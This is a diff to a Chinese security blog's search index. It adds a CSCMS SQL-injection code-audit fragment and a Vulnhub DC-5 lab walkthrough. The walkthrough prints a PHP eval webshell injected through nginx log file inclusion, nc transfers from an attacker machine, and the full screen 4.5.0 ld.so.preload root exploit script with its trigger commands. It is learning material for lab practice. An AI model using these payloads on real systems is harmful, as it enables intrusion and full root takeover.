@@ -1260,6 +1260,11 @@ echo 123;
 <p>_<br>在cscms/system/database/drivers/mysqli/mysqli_driver.php:_excute($sql)中，对SQL语句进行_preq_query($sql)后直接进行mysqli::query()进行查询。 </p>
 <p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120214352.png">  </p>
 <p>_preq_query()函数在匹配到存在delete语句时起作用，对我们没有影响。最后得到的结果是对sql语句的直接查询，导致sql注入。<br>在最开始获得数据的 $this-&gt;input-&gt;get_post()没有传递xss_clean参数，导致使用默认的xss_clean=false参数，也同时不进行sql注入的过滤。<br>同时使用的$this-&gt;db-&gt;query()整个过程都没有sql语句进行二次过滤，或者使用预编译导致直接拼接sql语句进行查询导致注入。 </p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>首先在index.php中经过前期的配置后，包含<code>cscms/config/sys/Cs_Cscms.php</code>文件<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121111532.png"><br>在Cs_CsCscms.php中首先判断网站是否已经安装，然后配置基本的全局信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121112546.png"><br>翻了一下没有发现，全局的默认GET 或者 POST 参数过滤。  </p>
+<p>核心文件主要在/plugins文件中.就先从dance开始审计。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121120623.png"><br>一路翻下来，在ajax.php文件发现一个直接将$_SESSION拼接到sql查询语句中。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121120826.png"><br>在开始的复现时，我们翻过-&gt;db-&gt;query的逻辑，并没有对参数进行二次过滤，也就是说这个语句很可能存在sql注入。现在开始往前查找函数的调用点。</p>
+<p>在mobile.js 和 pc.js都都分别有调用。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121121054.png"><br>在pc.js中又发现是通过album_fav函数进行调用，同时通过提示信息我们可以发现这可能是在专辑收藏处使用的。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121121209.png"><br>再次搜索album_fav有top.html和top-show.htm使用了该函数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121121509.png">  </p>
+<p>通过这些信息，我们在专辑推荐榜中点击具体专辑信息，在下方的收藏次找到了该函数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121122022.png">  </p>
+<p>admin/dance/::hy</p>
 ]]></content>
       <categories>
         <category>代码审计</category>
@@ -1302,6 +1307,51 @@ echo 123;
       <tags>
         <tag>phpstorm</tag>
         <tag>Xdebug</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-5靶机</title>
+    <url>/2022/01/22/DC-5%E9%9D%B6%E6%9C%BA/</url>
+    <content><![CDATA[<h1 id="DC-5靶机"><a href="#DC-5靶机" class="headerlink" title="DC-5靶机"></a>DC-5靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-5,314/">下载地址</a><br>目标:获得root权限，并拿到flag<br>特点:<br>任意文件包含+ngix日志写入小马<br>screen提权</p>
+<span id="more"></span>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描结果开发80端口和111RPC端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122151921.png">  </p>
+<p>进入之后是一个静态网页，点击了一下没有发现有效的信息。同时目录扫描的结果也存在/footer.php 和/thankyou.php两个文件。<br>footer.php十一个版权脚标  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155347.png">  </p>
+<p>thankyou.php如下  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155420.png">  </p>
+<p>这里去网上，搜索发现thankyou.php的版权标志不同，因此怀疑该处存在文件包含?(<del>我是不知道大佬怎么看出来的</del>)。    </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155707.png">  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155724.png">  </p>
+<p>接着用字典跑BurpSuite爆破参数得到file是传输的参数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155809.png">  </p>
+<p>接着尝试进行文件读取，发现可以读取passwd文件。  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155950.png">  </p>
+<p>通过前面的扫描知道http服务是使用ngix搭建的。我们可以往ngix中的日志写入php小马，然后读取日志文件运行。<br>接着读取nginx配置信息。获得日志文件路径  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置信息路径 /etc/nginx/nginx.conf</span><br><span class="line">日志路径</span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122160303.png">  </p>
+<p>现在往日志中写入一句话木马<br><code>file=&lt;?php eval($_POST[&#39;cmd2&#39;]); ?&gt;</code><br>使用蚁剑进行连接。  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122162829.png"></p>
+<p>打开终端后使用nc连接到kali<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122163202.png">  </p>
+<p>使用find查看是否存在可以提取的应用。没有常见的提取应用但是存在<code>screen-4.5.0</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171654.png">  </p>
+<p>尝试搜索是否存在可以提权的可能，存在可以提权的漏洞<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171826.png">  </p>
+<p>查看提权的文件，按照它的过程生成libhax.so 和 rootshell两个文件  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+<p>使用nc将这两个文件传输到/tmp目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lnvp 4444 &lt; libhax.so</span><br><span class="line">nc -lnvp 4444 &lt; rootshell</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">nc 10.1.1.139 4444 &gt; libhax.so</span><br><span class="line">nc 10.1.1.139 4444 &gt; rootshell</span><br></pre></td></tr></table></figure>
+<p>安装步骤输入指令获得root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172526.png">  </p>
+<p> 最后在/root查看flag<br> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172553.png"></p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+        <tag>靶机</tag>
+        <tag>文件包含</tag>
+        <tag>screen提权</tag>
       </tags>
   </entry>
 </search>
